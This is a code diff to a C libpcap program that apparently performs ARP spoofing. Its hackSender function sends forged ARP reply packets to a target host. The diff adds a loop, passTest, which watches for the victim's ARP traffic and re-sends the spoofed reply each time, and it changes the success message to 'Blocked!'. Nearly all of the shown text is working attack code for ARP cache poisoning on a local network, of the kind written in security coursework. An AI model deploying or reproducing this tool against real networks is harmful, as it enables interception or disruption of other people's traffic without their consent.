@@ -37,6 +37,13 @@ char * printMacAddress(u_char * mac) {
     return ret;
 }
 
+bool cmpMacAddress(u_char * a, u_char * b) {
+    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
+        if(a[i] != b[i]) return false;
+    }
+    return true;
+}
+
 uint8_t * parseIP(char * ori_ip) { // parsing string(ip)
     uint8_t * ip = (uint8_t *)malloc(sizeof(uint8_t) * IP_ADDR_LEN);
     char * token = strtok(ori_ip, ".");
@@ -79,11 +86,11 @@ u_char * makeArpPacket(u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uin
     memcpy(packet, ether_hdr, sizeof(struct ether_header));
     memcpy(packet + sizeof(struct ether_header), req, sizeof(struct ether_arp));
 
-    printf("Packet : ");
-    for(int i = 0; i < sizeof(struct ether_header) + sizeof(struct ether_arp); i++) {
-        printf("%02x ", packet[i]);
-    }
-    printf("\n\n");
+    // printf("Packet : ");
+    // for(int i = 0; i < sizeof(struct ether_header) + sizeof(struct ether_arp); i++) {
+    //     printf("%02x ", packet[i]);
+    // }
+    // printf("\n\n");
 
     return packet;
 }
@@ -144,11 +151,13 @@ u_char * getSenderMacAddress(pcap_t* handle, u_char * src_mac, uint8_t * src_ip,
     while (++cnt) {
         struct pcap_pkthdr * header;
         const u_char * packet;
+
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
-        u_char * sender_mac_address = DataLinkLayer(packet);
-        if(sender_mac_address) return sender_mac_address;
+
+        struct ether_arp * res_pcap = DataLinkLayer(packet);
+        if(res_pcap && ntohs(res_pcap -> ea_hdr.ar_op) == 2) return res_pcap -> arp_sha;
     }
     return NULL;
 }
@@ -158,5 +167,31 @@ void hackSender(pcap_t * handle, u_char * src_mac, u_char * des_mac, uint8_t * s
     u_char * packet = makeArpPacket(src_mac, des_mac, src_ip, des_ip, 2);
     pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp));
 
-    printf("[+] Success\n\n");
+    printf("[+] Blocked!\n");
+}
+
+void passTest(pcap_t * handle, u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uint8_t * des_ip) {
+    int cnt = 0;
+    u_char sender_mac[6];
+    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
+        sender_mac[i] = des_mac[i];
+    }
+
+    while (cnt < 3) {
+        struct pcap_pkthdr * header;
+        const u_char * packet;
+
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+
+        struct ether_arp * res_pcap = DataLinkLayer(packet);
+        
+        if(res_pcap) {
+            if(cmpMacAddress(res_pcap -> arp_sha, sender_mac) && cmpMacAddress(res_pcap -> arp_tha, src_mac)) {
+            cnt++;
+            hackSender(handle, src_mac, sender_mac, src_ip, des_ip);
+            }
+        }
+    }
 }
